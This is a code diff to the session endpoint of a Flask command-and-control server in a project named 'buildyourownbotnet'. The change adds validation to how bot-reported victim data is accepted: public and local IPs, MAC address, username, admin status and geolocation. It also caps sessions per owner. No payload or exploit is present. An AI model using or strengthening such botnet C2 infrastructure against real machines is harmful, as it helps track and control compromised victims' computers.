@@ -1,19 +1,49 @@
-import json
+import re
+from datetime import datetime
 from flask import current_app, Blueprint, request, redirect, url_for, flash, jsonify
 from flask_login import login_user, logout_user, current_user, login_required
 from buildyourownbotnet import c2
-from buildyourownbotnet.core.dao import session_dao, task_dao
+from buildyourownbotnet.core.dao import session_dao, task_dao, user_dao
 from buildyourownbotnet.models import db, Session
 
 # Blueprint
 session = Blueprint('session', __name__)
 
+# Bot-supplied metadata must not be able to set database identity or state
+# fields directly. Only these descriptive columns are accepted.
+SESSION_FIELDS = frozenset({
+	'public_ip', 'local_ip', 'mac_address', 'username', 'administrator',
+	'platform', 'device', 'architecture', 'latitude', 'longitude',
+})
+UID_RE = re.compile(r'^[0-9a-f]{32}$')
+MAX_SESSIONS_PER_OWNER = 100
+
+
 @session.route("/api/session/new", methods=["POST"])
 def session_new():
 	"""Add session metadata to database."""
-	if not request.json:
-		return redirect(url_for('main.sessions'))
-	data = dict(request.json)
+	if not request.json or not isinstance(request.json, dict):
+		return jsonify({'error': 'JSON object required'}), 400
+
+	data = {key: value for key, value in request.json.items() if key in SESSION_FIELDS}
+	owner = request.json.get('owner')
+	user = user_dao.get_user(username=owner) if isinstance(owner, str) else None
+	if user is None:
+		return jsonify({'error': 'unknown owner'}), 400
+	data['owner'] = user.username
+
+	uid = request.json.get('uid')
+	if uid is not None and (not isinstance(uid, str) or not UID_RE.fullmatch(uid)):
+		return jsonify({'error': 'invalid session uid'}), 400
+
+	# The endpoint is reachable from the C2 socket, not an operator login.
+	# Bound the number of fake sessions one owner can create.
+	if Session.query.filter_by(owner=user.username).count() >= MAX_SESSIONS_PER_OWNER:
+		return jsonify({'error': 'session limit reached'}), 429
+
+	data['uid'] = uid
+	# DAO expects a joined timestamp even when the bot supplied a uid.
+	data['joined'] = datetime.utcnow()
 	session_metadata = session_dao.handle_session(data)
 	return jsonify(session_metadata)
 
